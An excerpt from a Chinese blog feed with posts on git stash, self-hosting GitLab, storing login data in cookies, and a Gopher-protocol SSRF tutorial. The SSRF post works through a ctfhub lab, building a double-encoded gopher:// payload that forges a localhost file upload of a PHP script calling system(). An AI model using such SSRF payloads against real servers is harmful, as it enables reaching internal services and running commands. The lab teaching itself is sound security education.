<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"><span class="meta">$</span><span class="bash"> git stash</span></span><br><span class="line">Saved working directory and index state WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>等我们在新的分支上修复好<code>BUG</code>，并合并好分支，然后再将这个暂时的修复分支删除后，就可以切换到我们的<code>dev</code>分支上来继续我们的工作了。</p>
<p>可以看一下之前暂存的代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash list</span></span><br><span class="line">stash@&#123;0&#125;: WIP on dev: 274515d merge by no-ff</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch dev</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<p>回复我们的工作有两种方法：</p>
<ul>
<li>用<code>git stash apply</code>恢复，但是恢复后，<code>stash</code>中的内容并不删除，你需要用<code>git stash drop</code>来删除 </li>
<li>用<code>git stash pop</code>，该方法在恢复的同时把<code>stash</code>中的内容也删了： </li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git stash pop</span></span><br><span class="line">On branch dev</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   front.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line">Dropped refs/stash@&#123;0&#125; (414125ba81aaed29ef4736209c257077fb277202)</span><br></pre></td></tr></table></figure>

<p>然后我们就可以继续愉快地进行我们的工作了。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Gopher协议</title>
    <url>/2022/06/29/Gopher%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
<p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p>
</blockquote>
<a id="more"></a>

<p>该协议可以发送<code>get</code>和<code>post</code>请求，不过在此之前，我们应该先构造相应的数据包，然后进行<code>URL</code>编码，同时用<code>%0d%0a</code>替换回车换行符，而且使用该协议的时候，<code>ip</code>地址后面要跟上一个端口号。</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>在windows端开启一个<code>nc</code>监听（在此之前，你应该先安装）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -p -l 9999</span><br></pre></td></tr></table></figure>

<p>然后在kali linux中通过<code>gopher</code>协议访问该端口.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.120:8989/hello_yalexin</span><br></pre></td></tr></table></figure>

<p>我们会在Windows端收到信息:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ello_yalexin</span><br></pre></td></tr></table></figure>

<p>正如你所见，可以收到信息，不过第一个字符并没有收到。</p>
<p><img src="https://cdn.yalexin.top/image-20220629142405790.png" alt="image-20220629142405790"></p>
<h3 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a>发送GET请求</h3><p>在Windows端先准备一个<code>test.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_GET[<span class="string">"name"</span>].<span class="string">"!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个常见的<code>GET</code>请求<code>HTTP</code>包如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/test.php?name=yalexin</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.28</span><br></pre></td></tr></table></figure>

<p>发送之前我们需要将其进行<code>URL</code>编码，你可以使用很多在线工具完成。</p>
<p>人生苦短，我用<code>python</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># parse.py</span></span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">GET test.php?name=yalexin HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 192.168.1.28</span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># 注意要用 %0D%0A 代替回车换行</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>在<code>kali</code>中发送：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/GET%20/test.php%3Fname%3Dyalexin%20HTTP/1.1%0D%0AHost%3A%20192.168.1.28%0D%0A</span><br></pre></td></tr></table></figure>

<h3 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a>发送POST请求</h3><p>准备一个<code>post.php</code>：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Hello ,"</span>.$_POST[<span class="string">"name"</span>].<span class="string">"!"</span>.<span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>POST</code>的<code>HTTP</code>包格式为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/post.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">host:192.168.1.120</span></span><br><span class="line"><span class="attribute">Content-Type:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="attribute">Content-Length:12</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line">name=yalexin</span><br></pre></td></tr></table></figure>

<p>使用脚本编码后再发送请求：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">curl gopher://192.168.1.28:80/POST%20/post.php%20HTTP/1.1%0D%0Ahost%3A192.168.1.28%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A12%0D%0A%0D%0Aname%3Dyalexin%0D%0A</span><br></pre></td></tr></table></figure>

<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>以<a href="https://www.ctfhub.com/#/skilltree" target="_blank" rel="noopener">ctfhub技能树</a>的SSRF的上传文件为例。</p>
<p>我们先看一下源码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<p>返回内容：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>] != <span class="string">"127.0.0.1"</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Just View From 127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>]) &amp;&amp; $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> getenv(<span class="string">"CTFHUB"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Upload Webshell</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"/flag.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以发现只能从127.0.0.1中访问该脚本，且必须上传一个非空文件后才可以拿到<code>flag</code></p>
<p>我们可以先访问一下该脚本：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>

<p>但是我们发现无法提交表单，但是不要紧，我们在浏览器中手动添加提交按钮即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>提交一个文件后发现出错：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Just View From 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>看来要借助<code>gopher</code>协议了</p>
<p>在此之前，我们借助burpsuite进行抓包（重复刚刚的提交文件动作）</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/flag.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Length</span>: 340</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Origin</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span>: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="find.php"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">system('find / -name *flag*');</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">鎻愪氦</span><br><span class="line">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span><br></pre></td></tr></table></figure>

<p>使用我们的脚本<code>parse.py</code>之前，我们应该将上述数据包中的<code>Host</code>改为<code>127.0.0.1</code></p>
<p>，由于浏览器会自动URL解码一次，因此我们还应该再URL编码一次，即：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 340</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a989adeace7e1bf9.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="file"; filename="find.php"</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system('find / -name *flag*');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name="submit"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">鎻愪氦</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryy4kNDjSQVdU1NViJ--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span> </span><br><span class="line">urlStr = urllib.parse.quote(payload)</span><br><span class="line"><span class="comment"># 注意要用 %0D%0A 代替回车换行</span></span><br><span class="line">urlStr = urlStr.replace(<span class="string">'%0A'</span>,<span class="string">'%0D%0A'</span>)</span><br><span class="line"><span class="comment"># 再次编码</span></span><br><span class="line">urlStr = urllib.parse.quote(urlStr)</span><br><span class="line">print(urlStr)</span><br></pre></td></tr></table></figure>

<p>伪造如下请求数据：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span></span><br></pre></td></tr></table></figure>

<p>构造Payload（<strong>注意</strong>：gopher协议会将第一个字符吞掉，记得多补一个字符）：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%2520340%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/103.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A//challenge-a989adeace7e1bf9.sandbox.ctfhub.com%253A10800/%253Furl%253D127.0.0.1/flag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522find.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%250D%250A%250D%250Asystem%2528%2527find%2520/%2520-name%2520%252Aflag%252A%2527%2529%253B%250D%250A%250D%250A%253F%253E%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%250D%250A------WebKitFormBoundaryy4kNDjSQVdU1NViJ--%250D%250A%250D%250A</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220629154916452.png" alt="image-20220629154916452"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之搭建私服</title>
    <url>/2022/02/12/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%8D/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍如何搭建属于你自己的<code>Git</code>私服。</p>
<a id="more"></a>

<p>我们之前演示了如何使用第三方代码托管平台<code>Github</code>来作为我们远端仓库，不过虽然之前<code>Github</code>允许建立私有仓库，但是免费的之余还是有一些限制诸如协作者人数不能过多，况且有的时候我们视代码如命脉，不想开源又想使用<code>Git</code>怎么办？答案就是搭建私服！搭建私服有几种方式，下面介绍一种比较流行的，但是比较复杂。</p>
<p>前提提示：我的<code>Linux</code>系统是<code>centos7</code>。</p>
<h2 id="安装GitLab"><a href="#安装GitLab" class="headerlink" title="安装GitLab"></a>安装GitLab</h2><p>安装前提依赖：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y curl policycoreutils-python openssh-server perl</span><br></pre></td></tr></table></figure>

<p> 在系统防火墙中打开 <code>HTTP</code>、<code>HTTPS</code>和 <code>SSH</code>访问 （可选，不设置则只能从本地网络访问 ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl enable sshd</span><br><span class="line">sudo systemctl start sshd</span><br><span class="line">sudo firewall-cmd --permanent --add-service=http</span><br><span class="line">sudo systemctl reload firewalld</span><br></pre></td></tr></table></figure>

<p> 安装 <code>Postfix</code> 以发送电子邮件通知 （可选）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install postfix</span><br><span class="line">sudo systemctl enable postfix</span><br><span class="line">sudo systemctl start postfix</span><br></pre></td></tr></table></figure>

<p>下载<code>GitLab</code>安装包</p>
<p>到网站<a href="https://packages.gitlab.com/gitlab/gitlab-ce/下载合适的包" target="_blank" rel="noopener">https://packages.gitlab.com/gitlab/gitlab-ce/下载合适的包</a></p>
<blockquote>
<p>gitlab-ce是社区版，免费的<br>gitlab-ee是企业版，收费的</p>
</blockquote>
<p>找到合适的包后页面往下滑找到<code>wget</code>的地址复制下来到服务器中下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget --content-disposition https://packages.gitlab.com/gitlab/gitlab-ce/packages/el/7/gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm/download.rpm</span><br></pre></td></tr></table></figure>

<p>然后开始安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo rpm -Uvh gitlab-ce-14.7.2-ce.0.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<p> 安装成功后的提示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Thank you for installing GitLab! GitLab was unable to detect a valid hostname for your instance. Please configure a URL for your GitLab instance by setting &#96;external_url&#96; configuration in &#x2F;etc&#x2F;gitlab&#x2F;gitlab.rb file. Then, you can start your GitLab instance by running the following command:  sudo gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>按照提示，打开<code>/etc/gitlab/gitlab.rb</code>文件，搜索<code>external_url</code>选项，设置为<code>ip</code>地址（例如我的为<a href="http://124.222.8.87:81/）或者域名地址" target="_blank" rel="noopener">http://124.222.8.87:81/）或者域名地址</a></p>
<p>然后重新配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>

<p>然后开启<code>gitlab</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gitlab-ctl start</span><br></pre></td></tr></table></figure>

<p>然后访问之前设置的<code>ip</code>地址</p>
<p><img src="https://qiniu.yalexin.top/gitlab-0.png" alt></p>
<p> 用户名为<code>root</code>。初始密码是在<code>/etc/gitlab/initial_root_password</code>，不过该密码在执行<code>reconfigreure</code>后的24小时就会被删除，所以记性不好的话建议立即改密码。</p>
<blockquote>
<p>如果无法访问，则可能是没有开放防火墙端口</p>
<p>依次执行以下命令即可：</p>
<p><code>firewall-cmd --zone=public --list-ports</code> #查看开放端口<br><code>firewall-cmd --zone=public --add-port=81/tcp --permanent</code> #开放81端口<br><code>firewall-cmd --reload</code>   #重新加载配置<br>#如果不需要，也可以直接关闭防火墙，前提是不怕被运维的追着打！<br><code>systemctl stop firewalld.service</code></p>
</blockquote>
<p><strong>强烈建议服务器运行内存在2GB以上！！</strong></p>
<p>我的学生机真的只有2BG内存，还得开个4GB的虚拟内存才勉勉强强运行起来。</p>
<h2 id="注册并使用GitLab"><a href="#注册并使用GitLab" class="headerlink" title="注册并使用GitLab"></a>注册并使用GitLab</h2><p>我发现2GB实在是不能用，只好斥巨资几块钱在华为云上买了弹性计算型主机~~</p>
<p>登录后台以后，可以自行选择更改语言为简体中文，也可以使用默认的。</p>
<p>接下来就像使用<code>GitHub</code>一样啦！</p>
<p>先注册普通用户，因为你总不可能所有人都使用<code>root</code>账户吧！</p>
<p><img src="https://qiniu.yalexin.top/gitlab-1.png" alt></p>
<p>注册好以后，管理员后台审核即可。</p>
<p><img src="https://qiniu.yalexin.top/gitlab-2.png" alt></p>
<p><img src="https://qiniu.yalexin.top/gitlab-4.png" alt></p>
<p>通过以后，该普通用户就可以登录了。</p>
<p>当然了，为了能够正常使用，还<strong>需要添加<code>SSH</code>公钥。</strong></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Web 通过操控Cookie实现记住密码</title>
    <url>/2020/09/25/Java-Web-%E9%80%9A%E8%BF%87%E6%93%8D%E6%8E%A7Cookie%E5%AE%9E%E7%8E%B0%E8%AE%B0%E4%BD%8F%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h2 id="什么是Cookie？"><a href="#什么是Cookie？" class="headerlink" title="什么是Cookie？"></a>什么是Cookie？</h2><p>引用百度<a href="https://baike.baidu.com/item/cookie/1119" target="_blank" rel="noopener">百科</a>的说法，</p>
<blockquote>
<p>Cookie，有时也用其复数形式 <a href="https://baike.baidu.com/item/Cookies/187064" target="_blank" rel="noopener">Cookies</a>。类型为“<strong>小型文本文件</strong>”，是某些网站为了辨别用户身份，进行<a href="https://baike.baidu.com/item/Session/479100" target="_blank" rel="noopener">Session</a>跟踪而储存在用户本地终端上的数据（通常经过加密），由用户<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>计算机暂时或永久保存的信息</p>
</blockquote>
<p>说白了就是将浏览器上面的一些信息保存在用户的电脑上面，当然了这些数据一般不会产生严重影响，因为它永远不会以任何方式执行，也就避免带来了病毒或者攻击用户电脑，并且一般浏览器都会对<code>Cookie</code>的个数有限制，不用担心塞满用户电脑。<a id="more"></a></p>
<h2 id="有什么用？"><a href="#有什么用？" class="headerlink" title="有什么用？"></a>有什么用？</h2><p>可以用来记录用户访问该网站的频率、时间段等，最常用的就是“记住用户名和密码”，在一些登陆网站，当用户登陆的时候选择了“记住密码”，<code>Web</code>服务端就将用户名和密码进行处理（一般就是将密码进行加密），然后将处理后的字符串封装成一个<code>Cookie</code>进行保存。</p>
<h2 id="怎么用？"><a href="#怎么用？" class="headerlink" title="怎么用？"></a>怎么用？</h2><p>以<code>Java Web</code>为例：</p>
<p>首先新建登陆页面：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%--</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Author:</span> <span class="attr">Yalexin</span></span></span><br><span class="line"><span class="tag">    <span class="attr">Email:</span> <span class="attr">181303209</span>@<span class="attr">yzu.edu.cn</span> </span></span><br><span class="line"><span class="tag"><span class="attr">--</span>%&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">%</span></span></span><br><span class="line"><span class="tag">        <span class="attr">String</span> <span class="attr">username</span> = <span class="string">""</span>, <span class="attr">password</span> = <span class="string">""</span>;</span></span><br><span class="line"><span class="tag">        <span class="attr">Cookie</span>[] <span class="attr">cookies1</span> = <span class="string">request.getCookies();</span></span></span><br><span class="line"><span class="tag">        <span class="attr">if</span> (<span class="attr">cookies1</span> != <span class="string">null)&#123;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">for</span> (<span class="attr">Cookie</span> <span class="attr">cookie</span> <span class="attr">:</span> <span class="attr">cookies1</span>)&#123;</span></span><br><span class="line"><span class="tag">                <span class="attr">if</span> (<span class="attr">cookie.getName</span>()<span class="attr">.equals</span>("<span class="attr">userCookie</span>"))&#123;</span></span><br><span class="line"><span class="tag">                    <span class="attr">String</span>[] <span class="attr">split</span> = <span class="string">cookie.getValue().split(</span>"<span class="attr">-</span>&gt;</span>");</span><br><span class="line">                    username = split[0];</span><br><span class="line">                    password = split[1];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    %&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"login_1"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span 